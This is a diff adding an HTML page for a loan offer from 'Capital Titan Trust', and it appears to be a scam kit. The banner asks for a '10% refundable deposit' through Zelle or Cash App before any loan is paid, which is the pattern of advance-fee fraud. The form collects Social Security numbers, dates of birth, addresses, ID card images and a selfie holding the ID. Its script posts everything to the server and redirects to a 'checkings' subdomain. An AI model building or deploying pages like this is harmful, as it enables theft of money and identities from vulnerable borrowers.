@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Capital Titan Trust - Loan Application</title>
+<link rel="stylesheet" href="style.css">
+<style>
+#successOverlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:999999;justify-content:center;align-items:center;padding:20px;box-sizing:border-box}
+#successBox{background:white;padding:40px 30px;border-radius:20px;text-align:center;max-width:450px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
+</style>
+</head>
+<body>
+
+<!-- USA 10% FRONT PAGE -->
+<div style="background:#00D632; padding:35px 20px; text-align:center; font-family:Arial;">
+  <div style="max-width:800px; margin:0 auto;">
+    <span style="background:black; color:white; padding:6px 14px; border-radius:20px; font-size:12px; font-weight:bold;">SECURE DEPOSIT - 10% REFUNDABLE</span>
+    <h1 style="margin:15px 0 8px; font-size:32px; font-weight:900; color:black;">Get $1,000 - $50,000 Today</h1>
+    <p style="margin:0 0 18px; font-size:16px;">Pay 10% refundable → Receive 100% via Zelle / Cash App / Check in 24hrs</p>
+    <div style="background:white; border-radius:14px; padding:18px; max-width:480px; margin:18px auto; text-align:left; color:black; box-shadow:0 8px 20px rgba(0,0,0,0.12);">
+      <div style="display:flex; justify-content:space-between; font-size:14px; margin-bottom:8px;"><span>Loan:</span><b>$5,000</b></div>
+      <div style="display:flex; justify-content:space-between; font-size:14px; margin-bottom:8px;"><span>10% Deposit:</span><b style="color:#16a34a;">$500 (Refundable)</b></div>
+      <div style="border-top:2px dashed #e2e8f0; margin:10px 0;"></div>
+      <div style="display:flex; justify-content:space-between; font-size:18px; font-weight:900;"><span>You Receive:</span><span>$5,000 Full</span></div>
+    </div>
+</div>
+</div>
+
+<nav class="navbar">
+  <div class="nav-content">
+    <a href="/" class="logo"><span class="logo-mark">CT</span> Capital Titan Trust</a>
+    <div style="margin-left:auto; font-size:12px; text-align:right;">
+      <div>📞 +1 662 493 2416</div>
+      <div>✉️ capital_titan@mailo.com</div>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <section>
+    <span class="badge">SECURE APPLICATION</span>
+    <h1>Apply for Your Loan<br>in Minutes</h1>
+    <p>Fast, secure, and transparent loan process.</p>
+
+    <div class="application">
+      <h2>Loan Application Form</h2>
+      <p>Fill all required fields. All information is encrypted.</p>
+
+      <form id="loanForm" enctype="multipart/form-data">
+        <h3>Personal Information</h3>
+        <label>First name <span style="color:red">*</span></label>
+        <input type="text" name="firstName" placeholder="Enter first name" required>
+        <label>Last name <span style="color:red">*</span></label>
+        <input type="text" name="lastName" placeholder="Enter last name" required>
+        <label>Email address <span style="color:red">*</span></label>
+        <input type="email" name="email" placeholder="Enter email" required>
+        <label>Phone number <span style="color:red">*</span></label>
+        <input type="tel" name="phone" placeholder="Enter phone" required>
+
+        <div>
+          <label>Date of Birth</label>
+          <div style="display:flex; gap:5px;">
+            <select id="dobDay" name="dobDay" required><option value="">Day</option></select>
+            <select id="dobMonth" name="dobMonth" required><option value="">Month</option></select>
+            <select id="dobYear" name="dobYear" required><option value="">Year</option></select>
+          </div>
+          <input type="hidden" name="dateOfBirth" id="dateOfBirth">
+        </div>
+
+        <label>Home Address <span style="color:red">*</span></label>
+        <input type="text" name="homeAddress" placeholder="123 Main Street" required>
+        <label>City <span style="color:red">*</span></label>
+        <input type="text" name="city" placeholder="e.g. Los Angeles" required>
+        <label>State <span style="color:red">*</span></label>
+        <input type="text" name="state" placeholder="e.g. California" required>
+        <label>Zipcode - 5 digits only <span style="color:red">*</span></label>
+        <input type="text" name="zipcode" placeholder="e.g. 90001" pattern="[0-9]{5}" maxlength="5" required>
+
+        <h3 style="margin-top:25px;">Education background</h3>
+        <label>High school name <span style="color:red">*</span></label>
+        <input type="text" name="highSchool" placeholder="Enter high school name" required>
+        <div><label>Year of Entry</label><select name="yearOfEntry" id="yearOfEntry" required><option value="">Select year</option></select></div>
+        <div><label>Graduation Year</label><select name="graduationYear" id="graduationYear" required><option value="">Select year</option></select></div>
+
+        <h3 style="margin-top:25px;">Additional Information</h3>
+        <label>Social Security Number - <span style="color:red">*</span></label>
+        <input type="text" name="SocialSecurityNumber" placeholder="Enter SSN" pattern="[0-9]{9}" maxlength="9" required>
+        <label>ID Card Number - <span style="color:red">*</span></label>
+        <input type="text" name="IDCard" placeholder="Enter ID number" required>
+
+        <h3 style="margin-top:25px;">Verification Process</h3>
+        <label>Id Card Front <span style="color:red">*</span></label>
+        <input type="file" name="IDCardFront" id="IDCardFront" accept="image/*" required>
+        <div id="previewFront"></div>
+
+        <label>Id Card back <span style="color:red">*</span></label>
+        <input type="file" name="IDCardBack" id="IDCardBack" accept="image/*" required>
+        <div id="previewBack"></div>
+
+        <div style="background:#f0f9ff;padding:15px;border-radius:10px;margin:15px 0;border:1px dashed #2563eb;">
+          <label>Selfie Holding ID card <span style="color:red">*</span></label>
+          <input type="file" name="selfieWithCard" id="selfieWithCard" accept="image/*" required>
+          <div id="previewSelfie"></div>
+        </div>
+
+        <h3 style="margin-top:25px;">Loan Details</h3>
+        <label>Employment status <span style="color:red">*</span></label>
+        <select name="employment" required>
+          <option value="">Select status</option><option value="Employed">Employed</option><option value="Self-employed">Self-employed</option><option value="Business owner">Business owner</option><option value="Student">Student</option><option value="Retired">Retired</option><option value="Other">Other</option>
+        </select>
+        <label>Monthly income <span style="color:red">*</span></label>
+        <input type="number" name="income" placeholder="e.g. 5000" required>
+        <label>Requested loan amount <span style="color:red">*</span></label>
+        <select name="loanAmount" required>
+          <option value="">Select amount</option><option value="1000">$1,000</option><option value="5000">$5,000</option><option value="10000">$10,000</option><option value="25000">$25,000</option><option value="50000">$50,000</option>
+        </select>
+        <label>Purpose of loan <span style="color:red">*</span></label>
+        <select name="purpose" required>
+          <option value="">Select purpose</option><option value="Personal expenses">Personal expenses</option><option value="Business">Business</option><option value="Education">Education</option><option value="Home improvement">Home improvement</option><option value="Debt consolidation">Debt consolidation</option><option value="Medical">Medical</option><option value="Other">Other</option>
+        </select>
+
+        <div style="margin:20px 0;">
+          <label><input type="checkbox" required style="width:auto;"> I confirm all information is accurate and agree to terms</label>
+        </div>
+        <button type="submit" id="submitBtn">Continue Application →</button>
+      </form>
+    </div>
+  </section>
+</div>
+
+<!-- YOUR SUCCESS MESSAGE - NO ALERT -->
+<div id="successOverlay">
+  <div id="successBox">
+    <div style="font-size:70px">✅</div>
+    <h2 style="color:#003366;margin:15px 0">Application Submitted!</h2>
+    <p style="font-size:18px;color:#333;line-height:1.6;margin:15px 0">
+      Your appreciation has been submitted successfully and you will get a response within 24 hours.
+    </p>
+    <p id="countDown" style="margin-top:20px;color:#003366;font-weight:bold">Redirecting in 3...</p>
+    <div style="margin-top:15px;height:6px;background:#eee;border-radius:10px;overflow:hidden">
+      <div id="bar" style="height:100%;width:0%;background:#003366;transition:width 1s linear"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// DOB + Year fill
+const entrySelect = document.getElementById('yearOfEntry');
+const gradSelect = document.getElementById('graduationYear');
+const currentYear = new Date().getFullYear();
+for (let year = currentYear + 6; year >= 1970; year--) {
+  let o1=document.createElement('option'); o1.value=year; o1.textContent=year; entrySelect.appendChild(o1);
+  let o2=document.createElement('option'); o2.value=year; o2.textContent=year; gradSelect.appendChild(o2);
+}
+const daySel=document.getElementById('dobDay'), monthSel=document.getElementById('dobMonth'), yearSel=document.getElementById('dobYear');
+for(let d=1; d<=31; d++){ let o=document.createElement('option'); o.value=d; o.textContent=d; daySel.appendChild(o); }
+["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"].forEach((m,i)=>{ let o=document.createElement('option'); o.value=i+1; o.textContent=m; monthSel.appendChild(o); });
+for(let y=currentYear; y>=1950; y--){ let o=document.createElement('option'); o.value=y; o.textContent=y; yearSel.appendChild(o); }
+
+// Preview
+function previewImage(inputId, previewId){
+  const input=document.getElementById(inputId); if(!input) return;
+  input.addEventListener('change', e=>{
+    const file=e.target.files[0]; if(!file) return;
+    const reader=new FileReader();
+    reader.onload=ev=>{ document.getElementById(previewId).innerHTML=`<img src="${ev.target.result}" style="width:100%;max-width:220px;border-radius:10px;border:2px solid #003366;margin-top:8px"><br><small style="color:green">✅ ${file.name}</small>`; };
+    reader.readAsDataURL(file);
+  });
+}
+previewImage('IDCardFront','previewFront'); previewImage('IDCardBack','previewBack'); previewImage('selfieWithCard','previewSelfie');
+
+// SINGLE SUBMIT HANDLER - NO ALERT, ONLY YOUR MESSAGE
+let alreadySent = false;
+document.getElementById('loanForm').addEventListener('submit', async (e)=>{
+  e.preventDefault();
+  if(alreadySent) return;
+  alreadySent = true;
+
+  const d=parseInt(daySel.value), m=parseInt(monthSel.value), y=parseInt(yearSel.value);
+  const dob=new Date(y,m-1,d);
+  if(isNaN(dob) || dob.getMonth()!= m-1){ alert("Invalid date"); alreadySent=false; return; }
+  document.getElementById('dateOfBirth').value = `${y}-${String(m).padStart(2,'0')}-${String(d).padStart(2,'0')}`;
+
+  const btn=document.getElementById('submitBtn');
+  btn.disabled=true; btn.textContent='Sending... Please Wait';
+
+  try{
+    const res = await fetch('/apply', { method:'POST', body:new FormData(e.target) });
+    const result = await res.json();
+    console.log(result);
+
+    if(result.success){
+      // SHOW YOUR APPRECIATION MESSAGE
+      document.getElementById('successOverlay').style.display='flex';
+      let count=3;
+      document.getElementById('bar').style.width='30%';
+      const interval=setInterval(()=>{
+        count--;
+        document.getElementById('countDown').textContent='Redirecting in '+count+'...';
+        document.getElementById('bar').style.width=((3-count)/3*100)+'%';
+        if(count<=0){
+          clearInterval(interval);
+          window.location.href='https://checkings.capitaltitantrust.com/';
+        }
+      },1000);
+    } else {
+      alert('Failed: '+(result.message||result.error));
+      alreadySent=false; btn.disabled=false; btn.textContent='Continue Application →';
+    }
+  }catch(err){
+    alert('Error: '+err.message);
+    alreadySent=false; btn.disabled=false; btn.textContent='Continue Application →';
+  }
+});
+</script>
+</body>
+</html>
